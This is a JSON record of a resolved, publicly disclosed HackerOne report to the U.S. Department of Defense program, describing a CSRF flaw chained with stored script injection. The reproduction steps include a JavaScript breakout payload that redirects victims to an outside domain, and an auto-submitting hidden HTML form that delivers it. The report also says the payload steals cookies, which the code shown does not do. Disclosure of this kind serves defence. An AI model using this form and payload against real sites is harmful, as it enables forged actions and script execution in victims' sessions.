{
  "id": 2736979,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzM2OTc5",
  "url": "https://hackerone.com/reports/2736979",
  "title": "CSRF to XSS",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2024-09-24T20:50:31.259Z",
  "submitted_at": "2024-09-24T20:50:31.427Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "k0x",
    "url": "/k0x",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/stfmal1uvfme7gkrxnluyhg8y6kh/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-12-18T19:43:14.310Z",
  "bug_reporter_agreed_on_going_public_at": "2024-11-26T18:21:21.739Z",
  "team_member_agreed_on_going_public_at": "2024-12-18T19:43:14.162Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two distinct attack vectors, but when combined, they can significantly increase the impact of an attack.\n\n- **XSS (Cross-Site Scripting):** In an XSS attack, an attacker injects malicious scripts (typically JavaScript) into a trusted website. These scripts are then executed in the victim's browser without their knowledge. This allows attackers to steal sensitive data like cookies, session tokens, or perform actions on behalf of the user.\n- **CSRF (Cross-Site Request Forgery):** CSRF tricks a victim into performing unwanted actions on a web application where they are authenticated. When combined with XSS, attackers can bypass CSRF defenses by using the victim's active session to perform actions like changing account details, transferring funds, or modifying settings.\n\n## Impact\n\n- **Stealing Authentication Tokens:** XSS can steal session cookies, making it easier to forge authenticated requests via CSRF.\n- **Automating Malicious Actions:** XSS can directly create malicious requests, such as submitting forms or performing transactions, bypassing CSRF protections and leading to unauthorized actions on behalf of the victim.\n- **Higher Attack Success Rate:** When XSS and CSRF are combined, even CSRF tokens can be stolen and used, making it very hard for applications to prevent such attacks.\n\n## System Host(s)\nwww.█████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n**Step 1:** Malicious JavaScript Payload\n\nThe following JavaScript code represents a payload that an attacker could use to steal cookies:\n\n```javascript\nvideo\");\nalert('Hacked by k0x');\nsetTimeout(()=>location.href='████',5000);//\n```\n\n**Step 2:**  Malicious Website for CSRF\n\nAn attacker crafts a malicious Website to exploit the CSRF vulnerability. When a user clicks the link, it triggers a request to the vulnerable application (It could be redirected without a click):\n\n```html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://www.████████/alerts\" method=\"POST\">\n      <input type=\"hidden\" name=\"csrf&#95;token\" value=\"75ce3b80fbeb820dc230d2cf674283a5\" />\n      <input type=\"hidden\" name=\"alerts&#95;invite&#95;id\" value=\"\" />\n      <input type=\"hidden\" name=\"hash\" value=\"\" />\n      <input type=\"hidden\" name=\"search&#95;type\" value=\"content\" />\n      <input type=\"hidden\" name=\"search\" value=\"kaos\" />\n      <input type=\"hidden\" name=\"phrase\" value=\"0\" />\n      <input type=\"hidden\" name=\"phrase\" value=\"1\" />\n      <input type=\"hidden\" name=\"features&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"features&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"feed&#95;channels&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"feed&#95;channels&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"radius&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"radius&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"radius&#95;range\" value=\"10\" />\n      <input type=\"hidden\" name=\"state&#95;name\" value=\"&#45;1\" />\n      <input type=\"hidden\" name=\"state&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"hometown&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"hometown&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"personnel&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"personnel&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"publication&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"publication&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"series&#95;name\" value=\"&#45;1\" />\n      <input type=\"hidden\" name=\"series&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"tags&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"tags&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"unit&#95;name\" value=\"\" />\n      <input type=\"hidden\" name=\"unit&#95;input\" value=\"\" />\n      <input type=\"hidden\" name=\"source&#91;&#93;\" value=\"video&quot;&#41;&#59;&#13;&#10;alert&#40;&apos;Hacked&#32;by&#32;k0x&apos;&#41;&#59;&#13;&#10;setTimeout&#40;&#40;&#41;&#61;&gt;location&#46;href&#61;&apos;https&#58;&#47;&#47;k0x&#46;xyz&apos;&#44;5000&#41;&#59;&#47;&#47;\" />\n      <input type=\"hidden\" name=\"freq\" value=\"hourly\" />\n      <input type=\"hidden\" name=\"delivery&#95;method\" value=\"email\" />\n      <input type=\"hidden\" name=\"member&#95;email&#95;id\" value=\"1223198\" />\n      <input type=\"hidden\" name=\"submit\" value=\"CREATE&#32;NEWSWIRE\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n\n**Step 3:** Recreate Attack Flow\n\n1. **User Logs In:** The victim logs into the vulnerable application, maintaining an active session.\n2. **Clicking the Malicious Link:** The victim receives a message or email with the malicious link. Upon clicking, they are redirected to the attacker's controlled site.\n3. **CSRF Exploitation:** The malicious link triggers a CSRF attack that executes the injected JavaScript payload, which may steal cookies or perform unauthorized actions.\n4. **Payload Execution:** The attacker can use the stolen cookies or perform actions such as changing account settings, transferring funds, etc.\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 28,
  "voters": [
    "k0x",
    "2026",
    "thalaivar304",
    "mohaned0101",
    "aesle",
    "blackhacker8796",
    "sa1tama0",
    "aditaysunny06",
    "khaledvoc1",
    "chrisfire",
    "and 18 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
